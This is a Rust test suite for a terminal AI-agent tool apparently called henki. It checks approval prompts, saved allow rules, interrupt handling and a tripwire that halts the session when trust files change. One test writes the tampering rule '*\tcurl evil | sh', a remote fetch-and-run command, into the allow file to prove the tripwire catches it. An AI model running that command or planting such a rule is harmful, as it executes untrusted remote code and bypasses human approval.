#![allow(clippy::disallowed_methods, clippy::print_stdout, clippy::print_stderr, clippy::unwrap_used, clippy::expect_used, clippy::panic, clippy::string_slice)]
//! The REPL over a pseudo-terminal: the banner and prompt, streamed answers (escaped, and alone on stdout), the approval
//! display and its answers (`always` saves a rule after a confirmation), the `/` commands, Ctrl-C at every state,
//! `!CMD` on the terminal, the tripwire's refusal, a terminal that goes away, resume.
use crate::harness::*;
use crate::mock::*;
use crate::pty::{Pty, RESET};
use serde_json::{Value, json};
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::time::{Duration, Instant};

/// Generous for a loaded machine; every wait ends as soon as the text shows.
const W: Duration = Duration::from_secs(15);
const VERSION: &str = env!("CARGO_PKG_VERSION");
const REFUSED: &str = "henki: a trust file changed; restart henki to go on (henki --resume continues this session)\r\n";
const HINT: &str = "(Ctrl-C does not quit; /exit or Ctrl-D quits)\r\n";

/// A run in ask mode at `m`.
fn asking(m: &Mock) -> Run {
    let mut r = Run::new(&m.url());
    r.set("approve", "\"ask\"");
    r
}

/// `r` with the repo's `manager/` first on PATH, so `/mods` and `henki mods` find the manager.
fn managed(mut r: Run) -> Run {
    r.env("PATH", &format!("{}/manager:/usr/local/bin:/usr/bin:/bin", env!("CARGO_MANIFEST_DIR")));
    r
}

/// The REPL with `args` on a 24 x 80 terminal, at its first prompt.
fn start<'a>(r: &'a Run, args: &[&str]) -> Pty<'a> {
    let p = Pty::spawn(r, args, 24, 80);
    p.prompt(W);
    p
}

/// The end with exit `code`, and the postconditions.
fn ended(p: Pty<'_>, code: i32) -> Done {
    let d = p.wait(W);
    d.finish();
    assert_eq!(d.code, Some(code), "{}", d.diag());
    d
}

/// `/exit`: exit 0.
fn exit(p: Pty<'_>) -> Done {
    p.line("/exit");
    ended(p, 0)
}

/// A message and the end of its turn.
fn message(p: &Pty, text: &str, answer: &str) {
    p.line(text);
    p.expect(answer, W);
    p.prompt(W);
}

fn verdicts(d: &Done) -> Vec<Value> {
    d.of("approval").iter().map(|a| json!([a["verdict"], a["rule"]])).collect()
}

/// The rule line a matched call prints.
fn rule_used(r: &Run, cmd: &str, n: usize) -> String {
    format!("$ {cmd}  (allowed by rule {n} for {}, ~/.config/henki/allow)\r\n", r.root())
}

/// `!CMD` noted a changed trust file.
fn bang_changed(path: &std::path::Path) -> String {
    format!("henki: {} changed by !cmd; restart henki to apply it (henki --resume continues this session)\r\n", path.display())
}

#[test]
fn pty_banner_and_prompt() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect(&format!("henki {VERSION} · mock-model · {} (openai) · ctx 32,768\r\n", m.url()), W);
    p.expect("approval: ask\r\n", W);
    p.expect("config: ~/.config/henki/config.toml\r\nno modules on; /mods (or henki mods) lists the official mods\r\n", W);
    p.prompt(W);
    exit(p);
}

/// A base_url that is not a loopback literal is named in the banner: the session's text leaves the machine.
#[test]
fn pty_remote_base_url_notice() {
    let m = Mock::start(vec![]);
    let mut r = asking(&m);
    r.at("http://192.0.2.1:9/v1");
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect("henki: requests leave this machine: prompts, files and command output go to 192.0.2.1, unencrypted\r\n", W);
    p.prompt(W);
    exit(p);
}

#[test]
fn pty_answer_streams() {
    let pause = Step::Stall { before_first_byte: false, after_words: 0, for_ms: 30_000 };
    let m = Mock::start(vec![Step::Stream { parts: vec![say("early words"), pause, say(" late words")], finish: Some("stop".into()), done: true, hold_ms: 0 }]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("talk to me");
    p.expect("early words", W);
    assert!(m.log()[0].done.is_none(), "the words showed only after the reply ended");
    m.open_gate();
    p.expect(" late words\r\n> ", W);
    let d = exit(p);
    assert_eq!(d.of("assistant")[0]["msg"]["content"], "early words late words");
}

#[test]
fn pty_no_session_without_message() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let d = exit(start(&r, &[]));
    assert!(d.journal.is_none() && r.journals().is_empty(), "a session file without a message: {:?}", r.journals());
}

#[test]
fn pty_exit_command() {
    let m = Mock::start(vec![say("hello back")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    message(&p, "hello", "hello back");
    let d = exit(p);
    assert_eq!(d.kinds(), ["session", "user", "assistant", "turn_end", "close"]);
}

#[test]
fn pty_eof_exits() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.ctrl_d();
    ended(p, 0);
}

/// Every line of the call, never cut: escapes, a bidi override, a long run of spaces and a tab are shown and marked.
#[test]
fn pty_approval_display_full() {
    let cmd = format!("echo one\x1b[31m\u{202e}\necho{}done\t# check", " ".repeat(40));
    let m = Mock::start(vec![shell(&cmd), say("not run then")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("show it");
    p.expect("run? [y/N] ", W);
    let shown = format!(
        "{RESET}-- shell {}\r\n-- command (2 lines, 73 bytes) {}\r\n!| echo one\\x1b[31m\\u{{202e}}\r\n!| echo[40 spaces]done\\t# check\r\nrun? [y/N] ",
        "-".repeat(63),
        "-".repeat(41)
    );
    let screen = String::from_utf8_lossy(&p.screen()).into_owned();
    assert!(screen.contains(&shown), "the reset, then the display:\n{shown:?}\nnot in\n{screen:?}");
    p.line("n");
    p.expect("not run then", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![json!(["no", null])], &json!("denied by the user")));
}

#[test]
fn pty_approval_yes() {
    let m = Mock::start(vec![shell("echo approved > yes.txt"), say("ran it")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("make the file");
    p.expect("run? [y/N/always] ", W);
    p.line("y");
    p.expect("$ echo approved > yes.txt\r\n", W);
    p.expect("$ echo approved > yes.txt -> exit 0, ", W);
    p.expect("ran it", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["yes", null])]);
    assert_eq!(fs::read_to_string(r.path("yes.txt")).unwrap(), "approved\n");
}

#[test]
fn pty_approval_no_denied() {
    let m = Mock::start(vec![shell("touch no.txt"), say("fine, I will not")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("make the file");
    p.expect("run? [y/N/always] ", W);
    p.line("nope");
    p.expect("fine, I will not", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!((verdicts(&d), &d.results()[0]["content"], &d.results()[0]["is_error"]), (vec![json!(["no", null])], &json!("denied by the user"), &json!(true)));
    assert!(!r.path("no.txt").exists() && m.log().len() == 2, "the turn goes on after a denial");
}

/// Ctrl-D at a question leaves: the turn ends at once (no answer is journaled, the call is not run, and no later question
/// of the turn is answered for the user), then the REPL quits at its prompt.
#[test]
fn pty_approval_eof_ends_turn() {
    let m = Mock::start(vec![shell("touch eof.txt"), shell("touch eof2.txt"), say("never")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("make the file");
    p.expect("run? [y/N/always] ", W);
    p.ctrl_d();
    p.expect("(interrupted)\r\n", W);
    let screen = String::from_utf8_lossy(&p.screen()).into_owned();
    assert!(screen.contains("run? [y/N/always] \r\n(interrupted)\r\n"), "not on a row of its own:\n{screen:?}");
    let d = ended(p, 0); // at the next prompt
    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![], &json!("not run: interrupted")), "{}", d.diag());
    assert_eq!((m.log().len(), d.of("ask").len()), (1, 1), "a later question answered for the user\n{}", d.diag());
    assert!(!r.path("eof.txt").exists() && !r.path("eof2.txt").exists());
}

#[test]
fn pty_approval_taller_than_screen() {
    let cmd: Vec<String> = (1..=30).map(|i| format!("echo {i}")).collect();
    let m = Mock::start(vec![shell(&cmd.join("\n")), say("too tall")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("count");
    p.expect("| echo 30\r\n", W);
    p.expect("33 rows: taller than the screen; scroll up or answer n\r\nrun? [y/N] ", W);
    p.line("n");
    p.expect("too tall", W);
    p.prompt(W);
    exit(p);
}

#[test]
fn pty_always_saves_rule() {
    let m = Mock::start(vec![shell("echo saved-rule"), say("saved and ran")]);
    let mut r = asking(&m);
    let root = r.root();
    let p = start(&r, &[]);
    p.line("save it");
    p.expect("run? [y/N/always] ", W);
    p.line("always");
    let warning = format!("a rule allows whatever this command does in {root}, including the files and config it reads\r\n");
    p.expect(&warning, W);
    p.expect(&format!("save rule for {root}: echo saved-rule ? [y/N] "), W);
    let screen = String::from_utf8_lossy(&p.screen()).into_owned();
    assert!(screen.contains(&format!("{RESET}{warning}")), "no reset right before the confirmation:\n{screen:?}");
    p.line("y");
    p.expect(&format!("added to ~/.config/henki/allow as rule 1 for {root}; /allow lists and removes rules\r\n"), W);
    p.expect("saved and ran", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["always", 1])]);
    let header = "# henki allow rules: ROOT<TAB>COMMAND, one per line; COMMAND then runs without asking in ROOT.\n\
        # List and remove them with henki mods allow [rm N] (/allow in henki); or edit this file.\n";
    assert_eq!(fs::read_to_string(r.allow()).unwrap(), format!("{header}{root}\techo saved-rule\n"));
    assert_eq!(fs::metadata(r.allow()).unwrap().permissions().mode() & 0o777, 0o600);
    let m2 = Mock::start(vec![shell("echo saved-rule"), say("ran by the rule")]);
    r.at(&m2.url());
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect("allow:   1  echo saved-rule\r\n", W);
    p.prompt(W);
    p.line("again");
    p.expect(&rule_used(&r, "echo saved-rule", 1), W);
    p.expect("ran by the rule", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!((verdicts(&d), d.of("ask").len()), (vec![json!(["rule", 1])], 0), "{}", d.diag());
}

#[test]
fn pty_always_confirm_no() {
    let m = Mock::start(vec![shell("touch confirm.txt"), say("left alone")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("make the file");
    p.expect("run? [y/N/always] ", W);
    p.line("always");
    p.expect(" ? [y/N] ", W);
    p.line("n");
    p.expect("run? [y/N/always] ", W);
    p.line("n");
    p.expect("left alone", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["no", null])]);
    assert!(!r.allow().exists() && !r.path("confirm.txt").exists());
}

/// While a process from an earlier call runs, `always` is not offered: the command may be what talks to it.
#[test]
fn pty_always_off_background() {
    let mut r = Run::new("");
    let m = Mock::start(vec![shell(&format!("sleep {} & echo started", r.marker)), shell("echo next"), say("done")]);
    r.at(&m.url()).set("approve", "\"ask\"");
    let p = start(&r, &[]);
    p.line("start it");
    p.expect("run? [y/N/always] ", W);
    p.line("y");
    p.expect("henki: 1 background processes still run; always is off until they end\r\n", W);
    p.expect("run? [y/N] ", W);
    p.line("n");
    p.expect("done", W);
    p.prompt(W);
    exit(p);
}

/// A call `always` cannot save: the question omits it, and typed anyway it gets the one note.
#[test]
fn pty_always_refused_shapes() {
    let calls = [shell("echo a\necho b"), shell(&format!("echo {}", "x".repeat(196))), shell("g\u{456}t status"), call("write", json!({"path": "f.txt", "content": "x"}))];
    let m = Mock::start([calls.to_vec(), vec![say("all refused")]].concat());
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("try them");
    for _ in &calls {
        p.expect("run? [y/N] ", W);
        p.line("always");
        p.expect("henki: always is not offered for this call; answer y or n\r\nrun? [y/N] ", W);
        p.line("n");
    }
    p.expect("all refused", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), vec![json!(["no", null]); 4]);
    assert!(!r.allow().exists());
}

/// `/allow` and `/allow rm N` run the manager on the terminal; the removal is a change to a trust file, which the manager
/// hands back as `restart`: henki names the file and asks, and n leaves the session stopped until a restart reads the
/// rules again.
#[test]
fn pty_allow_list_and_rm() {
    let m = Mock::start(vec![say("never")]);
    let r = managed(asking(&m));
    let root = r.root();
    r.write_allow(&format!("# mine\n{root}\techo one\n{root}\techo two\n"));
    let p = start(&r, &[]);
    p.line("/allow");
    p.expect(&format!("{}\r\n1  {root}  echo one\r\n2  {root}  echo two\r\n", r.allow().display()), W);
    p.prompt(W);
    p.line("/allow rm 1");
    p.expect(&format!("removed rule 1: {root}  echo one\r\n"), W);
    p.expect("henki: changed while /allow ran: ~/.config/henki/allow\r\nrestart on these changes? [y/N] ", W);
    p.line("n");
    p.prompt(W);
    p.line("/allow");
    p.expect(&format!("{}\r\n1  {root}  echo two\r\n", r.allow().display()), W);
    p.prompt(W);
    p.line("hello");
    p.expect(REFUSED, W);
    p.prompt(W);
    exit(p);
    assert_eq!(fs::read_to_string(r.allow()).unwrap(), format!("# mine\n{root}\techo two\n"));
    assert!(m.log().is_empty(), "commands never reach the model");
}

/// y to the restart question: henki closes the session and starts again with its arguments, the rules read anew.
#[test]
fn pty_allow_rm_restart() {
    let m = Mock::start(vec![say("after the restart")]);
    let r = managed(asking(&m));
    let root = r.root();
    r.write_allow(&format!("{root}\techo one\n{root}\techo two\n"));
    let p = start(&r, &["--model", "mock-model"]);
    p.line("/allow rm 1");
    p.expect("restart on these changes? [y/N] ", W);
    p.line("y");
    p.expect("allow:   1  echo two\r\n", W);
    p.prompt(W);
    message(&p, "hello", "after the restart");
    let d = exit(p);
    assert_eq!(r.journals().len(), 1, "the first session had no message: it was discarded\n{}", d.diag());
    assert_eq!(m.log().len(), 1);
}

/// The allow file changed outside henki since it was loaded, then `/allow rm` removed a rule: the change from before
/// is named as such, never blamed on the command, and no one-key restart is offered.
#[test]
fn pty_allow_rm_after_outside_change_trips() {
    let m = Mock::start(vec![say("never")]);
    let r = managed(asking(&m));
    let text = format!("{}\techo one\n", r.root());
    r.write_allow(&text);
    let p = start(&r, &[]);
    fs::write(r.allow(), format!("{text}*\techo two\n")).unwrap();
    p.line("/allow rm 1");
    p.expect(&format!("henki: trust file changed: {}\r\nremoved rule 1: {}  echo one\r\n", r.allow().display(), r.root()), W);
    p.expect("henki: a trust file changed before; restart henki yourself (henki --resume continues this session)\r\n", W);
    p.prompt(W);
    assert_eq!(fs::read_to_string(r.allow()).unwrap(), "*\techo two\n");
    p.line("hello");
    p.expect(REFUSED, W);
    p.prompt(W);
    let d = exit(p);
    assert!(m.log().is_empty());
    assert!(!d.out().contains("changed while /allow") && !d.out().contains("[y/N]"), "{}", d.out());
}

/// `/allow` and `/mods` with arguments the manager refuses: its usage on the terminal, nothing removed, no trip.
#[test]
fn pty_allow_usage_removes_nothing() {
    let m = Mock::start(vec![say("still here")]);
    let r = managed(asking(&m));
    let rules = format!("{}\techo kept\n", r.root());
    r.write_allow(&rules);
    let p = start(&r, &[]);
    for cmd in ["/allow x", "/allow rm", "/allow rm 1 2", "/allow rm -1", "/mods allow clear"] {
        p.line(cmd);
        p.expect("usage: henki-mods [list]", W);
        p.prompt(W);
    }
    message(&p, "hello", "still here");
    exit(p);
    assert_eq!(fs::read_to_string(r.allow()).unwrap(), rules);
}

/// `/mods ARGS`: the shipped manager with the tool environment plus HENKI_CONFIG and HENKI_BIN, its words split at
/// spaces, in the session's working directory; never a module's command of that name.
#[test]
fn pty_mods_environment() {
    let m = Mock::start(vec![]);
    let mut r = asking(&m);
    let dir = r.dir.join("bin");
    fs::create_dir_all(&dir).unwrap();
    fs::write(dir.join("henki-mods"), "#!/bin/sh\nfor a in \"$@\"; do echo \"arg $a\"; done\npwd\nenv | grep -E '^(HENKI_|SECRET)' | sort\n").unwrap();
    fs::set_permissions(dir.join("henki-mods"), fs::Permissions::from_mode(0o755)).unwrap();
    r.env("PATH", &format!("{}:/usr/local/bin:/usr/bin:/bin", dir.display())).env("SECRET_TOKEN", "t");
    let p = start(&r, &[]);
    p.line("/mods  add   ./x  --yes");
    p.expect(&format!("arg add\r\narg ./x\r\narg --yes\r\n{}\r\n", r.cwd.display()), W);
    p.expect(&format!("HENKI_BIN={}\r\nHENKI_CONFIG={}\r\nHENKI_DEPTH=1\r\n", Path::new(&bin()).display(), r.config_dir().display()), W);
    p.prompt(W);
    let d = exit(p);
    assert!(!d.out().contains("SECRET_TOKEN"), "the tool environment only: {}", d.out());
}

/// A module's `bin/henki-mods` is never the manager: without the shipped one, `/mods` says so and runs nothing.
#[test]
fn pty_mods_never_a_module() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let x = r.config_dir().join("ext/fake");
    fs::create_dir_all(x.join("bin")).unwrap();
    fs::write(x.join("doc.md"), "fake: a fake manager\n").unwrap();
    fs::write(x.join("bin/henki-mods"), "#!/bin/sh\necho module ran\n").unwrap();
    fs::set_permissions(x.join("bin/henki-mods"), fs::Permissions::from_mode(0o755)).unwrap();
    let p = start(&r, &[]);
    p.line("/mods");
    p.expect("henki: /mods needs henki-mods next to henki or on PATH; fix: reinstall henki\r\n", W);
    p.prompt(W);
    let d = exit(p);
    assert!(!d.out().contains("module ran") && !d.out().contains("no modules on"), "{}", d.out());
}

#[test]
fn pty_ctrl_c_idle_hint() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    for _ in 0..2 {
        p.ctrl_c();
        p.expect(&format!("\r\n{HINT}> "), W);
    }
    exit(p);
}

#[test]
fn pty_ctrl_c_busy_cancels() {
    let m = Mock::start(vec![Step::Stall { before_first_byte: false, after_words: 2, for_ms: 30_000 }, say("after the cancel")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("talk");
    p.expect("w1 w2", W);
    p.ctrl_c();
    p.expect("\r\n(interrupted)\r\n", W);
    p.prompt(W);
    assert!(m.wait_closed(0, W), "the request stayed open");
    message(&p, "again", "after the cancel");
    let d = exit(p);
    let a = &d.of("assistant")[0];
    assert_eq!((a["finish"].as_str(), a["msg"]["content"].as_str()), (Some("interrupted"), Some("w1 w2")), "{}", d.diag());
    let kept = ["w1 w2\n(interrupted)\n", "w1 w2^C\n(interrupted)\n"].iter().any(|k| d.out().contains(k));
    assert!(kept, "the partial answer keeps its row (the terminal may echo ^C):\n{}", d.out());
}

/// Ctrl-C while a call runs sends its process group SIGINT first, as a shell would.
#[test]
fn pty_ctrl_c_call_sigint_first() {
    let mut r = Run::new("");
    let m = Mock::start(vec![shell(&format!("trap 'echo got-int > int.txt; exit 0' INT; sleep {} & wait", r.marker))]);
    r.at(&m.url());
    let p = start(&r, &[]);
    p.line("run it");
    p.expect(&format!("$ trap 'echo got-int > int.txt; exit 0' INT; sleep {} & wait\r\n", r.marker), W);
    // The sleep, not bash (whose command line holds the marker too): bash forks it only after the trap is set.
    assert!(poll(W, || marked(&r.marker).iter().any(|(_, c)| c.starts_with("sleep "))), "the call did not start");
    p.ctrl_c();
    p.expect("(interrupted)\r\n", W);
    p.prompt(W);
    assert!(poll(W, || fs::read_to_string(r.path("int.txt")).is_ok_and(|t| t == "got-int\n")), "the call never saw SIGINT");
    exit(p);
}

#[test]
fn pty_ctrl_c_approval_denies() {
    let m = Mock::start(vec![shell("touch cc.txt"), say("moving on")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("make the file");
    p.expect("run? [y/N/always] ", W);
    p.ctrl_c();
    p.expect("moving on", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![json!(["no", null])], &json!("denied by the user")));
    assert!(!r.path("cc.txt").exists());
}

/// A `y` typed while the answer streams is dropped before the question, so it never answers it.
#[test]
fn pty_typeahead_not_an_answer() {
    let pause = Step::Stall { before_first_byte: false, after_words: 0, for_ms: 30_000 };
    let reply = Step::Stream { parts: vec![say("thinking it over"), pause, shell("touch ahead.txt")], finish: Some("tool_calls".into()), done: true, hold_ms: 0 };
    let m = Mock::start(vec![reply, say("asked properly")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("go");
    p.expect("thinking it over", W);
    p.line("y");
    m.open_gate();
    p.expect("run? [y/N/always] ", W);
    p.line("n");
    p.expect("asked properly", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["no", null])], "the typed-ahead y answered\n{}", d.diag());
    assert!(!r.path("ahead.txt").exists());
}

#[test]
fn pty_bang_on_terminal() {
    let m = Mock::start(vec![say("reply-one"), say("reply-two")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    message(&p, "first", "reply-one");
    p.line("!tty");
    p.expect(&format!("\r\n{}\r\n> ", p.name), W);
    message(&p, "second", "reply-two");
    let d = exit(p);
    let users = m.log()[1].contents("user");
    assert!(users[0].ends_with("\n\nfirst"), "{users:?}");
    assert_eq!(users[1], "[the user ran in their terminal: tty (exit 0)]\nsecond", "{}", d.diag());
}

/// What the user types while `!cat` runs goes to cat, never to the model.
#[test]
fn pty_after_bang_text_not_sent() {
    let m = Mock::start(vec![say("never")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("!cat");
    // henki gives the terminal back (its own modes) before cat starts; from then on it reads nothing.
    assert!(poll(W, || p.modes().c_lflag & libc::ICANON != 0), "the terminal is not canonical again");
    p.line("typed-into-cat");
    p.expect("typed-into-cat\r\n", W);
    p.expect("typed-into-cat\r\n", W);
    p.ctrl_d();
    p.prompt(W);
    let d = exit(p);
    assert!(m.log().is_empty() && d.journal.is_none(), "{}", d.diag());
}

#[test]
fn pty_bang_ctrl_c_to_command() {
    let m = Mock::start(vec![say("noted")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line(&format!("!sleep {}", r.marker));
    assert!(poll(W, || !marked(&r.marker).is_empty()), "the command did not start");
    p.ctrl_c();
    p.expect("> ", W); // on the row of the echoed ^C
    assert!(poll(W, || marked(&r.marker).is_empty()), "the command outlived Ctrl-C");
    message(&p, "what happened", "noted");
    let d = exit(p);
    let user = d.of("user")[0]["msg"]["content"].as_str().unwrap().to_string();
    assert!(user.ends_with(&format!("[the user ran in their terminal: sleep {} (exit 130)]\nwhat happened", r.marker)), "{user}");
}

#[test]
fn pty_bang_term_exits() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line(&format!("!sleep {}", r.marker));
    assert!(poll(W, || !marked(&r.marker).is_empty()), "the command did not start");
    let t = Instant::now();
    p.signal(libc::SIGTERM);
    let d = ended(p, 130);
    assert!(d.exited - t <= Duration::from_secs(1), "exit {:?} after SIGTERM", d.exited - t);
}

/// A command that leaves the terminal raw and silent: henki restores the modes, so typing echoes, and Ctrl-C and Enter
/// work again.
#[test]
fn pty_bang_raw_mode_restored() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("!stty raw -echo");
    p.prompt(W);
    p.line("/help");
    p.expect("/help\r\n/exit  quit (also Ctrl-D)\r\n", W); // the typed line is echoed again
    p.prompt(W);
    p.ctrl_c();
    p.expect(HINT, W);
    p.expect("> ", W);
    p.send(b"/exit\r");
    ended(p, 0);
}

/// When a call starts the REPL shows its head line on a row of its own, before the call ends; then the call line.
#[test]
fn pty_call_head_line() {
    let wait = "for i in $(seq 300); do [ -f go ] && break; sleep 0.05; done; echo went";
    let m = Mock::start(vec![Step::Stream { parts: vec![say("Let me check."), shell(wait)], finish: Some("tool_calls".into()), done: true, hold_ms: 0 }, say("all done")]);
    let r = Run::new(&m.url());
    let p = start(&r, &[]);
    p.line("check");
    p.expect(&format!("Let me check.\r\n$ {wait}\r\n"), W);
    assert!(!String::from_utf8_lossy(&p.screen()).contains(" -> exit"), "the call ended before its head line showed");
    fs::write(r.path("go"), "").unwrap();
    p.expect(&format!("$ {wait} -> exit 0, "), W);
    p.expect("all done", W);
    p.prompt(W);
    exit(p);
}

#[test]
fn pty_tripwire_refuses_messages() {
    let mut r = Run::new("");
    let m = Mock::start(vec![shell(&format!("echo '# changed' >> {}", r.config_path.display())), say("never")]);
    r.at(&m.url()).set("approve", "\"ask\"");
    let says = format!("trust file changed: {}", r.config_path.display());
    let p = start(&r, &[]);
    p.line("change the config");
    p.expect("run? [y/N/always] ", W);
    p.line("y");
    p.expect(&format!("henki: {says}\r\n"), W);
    p.expect(&format!("(error changed: {says})\r\n"), W);
    p.prompt(W);
    p.line("are you there");
    p.expect(REFUSED, W);
    p.prompt(W);
    exit(p);
    assert_eq!(m.log().len(), 1, "nothing sent after the change");
}

#[test]
fn pty_bang_trust_change_trips() {
    let m = Mock::start(vec![say("never")]);
    let r = asking(&m);
    let agents = r.config_dir().join("AGENTS.md");
    let p = start(&r, &[]);
    p.line(&format!("!touch {}", agents.display()));
    p.expect(&bang_changed(&agents), W);
    p.prompt(W);
    p.line("hello");
    p.expect(REFUSED, W);
    p.prompt(W);
    exit(p);
    assert!(m.log().is_empty());
}

/// `!henki allow rm 1` revokes a rule: the session stops, and after a restart the same call asks again.
#[test]
fn pty_bang_revoke_applies() {
    let m = Mock::start(vec![shell("echo rule-call"), say("first done")]);
    let mut r = managed(asking(&m));
    r.write_allow(&format!("{}\techo rule-call\n", r.root()));
    let p = start(&r, &[]);
    p.line("use the rule");
    p.expect(&rule_used(&r, "echo rule-call", 1), W);
    p.expect("first done", W);
    p.prompt(W);
    p.line(&format!("!{} allow rm 1", bin().to_str().unwrap()));
    p.expect(&format!("removed rule 1: {}  echo rule-call\r\n", r.root()), W);
    p.expect(&bang_changed(&r.allow()), W);
    p.prompt(W);
    p.line("and again");
    p.expect(REFUSED, W);
    p.prompt(W);
    exit(p);
    let m2 = Mock::start(vec![shell("echo rule-call"), say("asked this time")]);
    r.at(&m2.url());
    let p = start(&r, &["--resume"]);
    p.line("again please");
    p.expect("run? [y/N/always] ", W);
    p.line("n");
    p.expect("asked this time", W);
    p.prompt(W);
    let d = exit(p);
    assert!(!d.out().contains("(allowed by rule"), "a revoked rule matched:\n{}", d.out());
    assert_eq!(verdicts(&d), [json!(["no", null])]);
}

#[test]
fn pty_term_at_idle_130() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.signal(libc::SIGTERM);
    ended(p, 130);
}

#[test]
fn pty_resume_continues() {
    let m = Mock::start(vec![say("first reply")]);
    let mut r = asking(&m);
    let p = start(&r, &[]);
    message(&p, "first message", "first reply");
    let first = exit(p);
    let m2 = Mock::start(vec![say("second reply")]);
    r.at(&m2.url());
    let p = start(&r, &["--resume"]);
    message(&p, "second message", "second reply");
    let d = exit(p);
    assert_eq!(d.journal, first.journal, "the same session file");
    let l = &m2.log()[0];
    let users = l.contents("user");
    assert!(users.len() == 2 && users[0].ends_with("\n\nfirst message") && users[1] == "second message", "{users:?}");
    assert_eq!(l.contents("assistant"), ["first reply"]);
}

#[test]
fn pty_auto_banner() {
    let m = Mock::start(vec![]);
    let r = Run::new(&m.url());
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect(&format!("approval: AUTO (from {}:3)\r\n", r.config_path.display()), W);
    p.prompt(W);
    exit(p);
}

#[test]
fn pty_small_window_warning() {
    let m = Mock::start(vec![]);
    let mut r = asking(&m);
    r.set("context_window", "8192");
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect(
        "henki: context_window is 8,192 tokens, too small for most tasks; fix: start llama-server with -c 32768 (Ollama: OLLAMA_CONTEXT_LENGTH=32768) and set context_window = 32768\r\n",
        W,
    );
    p.prompt(W);
    exit(p);
}

/// At start the banner counts this root's rules and lists each of them, never another root's.
#[test]
fn pty_rules_listed_at_start() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    r.write_allow(&format!("/somewhere/else\techo other\n{root}\techo mine\n{root}\techo also mine\n", root = r.root()));
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect("henki: allow: 2 rules apply to this root (~/.config/henki/allow; /allow lists them)\r\n", W);
    p.expect("allow:   2  echo mine\r\nallow:   3  echo also mine\r\n", W);
    p.prompt(W);
    let d = exit(p);
    assert!(!d.out().contains("echo other"), "{}", d.out());
}

/// The allow file changed outside henki while the question was up: a confirmed `always` appends nothing, the turn ends
/// `changed`, and the session refuses messages.
#[test]
fn pty_always_after_outside_change_trips() {
    let m = Mock::start(vec![shell("echo outside-then-always"), say("never")]);
    let r = asking(&m);
    r.write_allow("# mine\n");
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    let outside = "# mine\n*\tcurl evil | sh\n";
    fs::write(r.allow(), outside).unwrap();
    p.line("always");
    p.expect(" ? [y/N] ", W);
    p.line("y");
    let says = format!("trust file changed: {}", r.allow().display());
    p.expect(&format!("henki: {says}\r\n"), W);
    p.expect(&format!("(error changed: {says})\r\n"), W);
    p.prompt(W);
    p.line("hello");
    p.expect(REFUSED, W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(fs::read(r.allow()).unwrap(), outside.as_bytes(), "henki wrote to the changed file");
    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![], &json!("not run: trust file changed")), "{}", d.diag());
    assert_eq!(m.log().len(), 1, "a request after the change");
}

/// `always` and a `y` typed with it come as one block, which is no answer at all: a no, so no rule is saved without a
/// confirmation of its own.
#[test]
fn pty_always_confirm_typeahead() {
    let m = Mock::start(vec![shell("echo typed-ahead"), say("asked again")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    p.send(b"always\ny\n");
    p.expect("henki: a paste is not an answer; taken as no\r\n", W);
    p.expect("asked again", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["no", null])], "the typed-ahead y confirmed\n{}", d.diag());
    assert!(!r.allow().exists(), "a rule saved without a separate y");
}

/// Ctrl-C at the confirmation saves nothing and asks `run?` again, on a row of its own; the end of input there saves
/// nothing either and ends the turn, and then the REPL.
#[test]
fn pty_always_confirm_ctrl_c() {
    let m = Mock::start(vec![shell("touch kept-out.txt"), say("never")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    p.line("always");
    p.expect(" ? [y/N] ", W);
    p.ctrl_c();
    p.expect("\r\nrun? [y/N/always] ", W); // no ^C: the question reads without echo
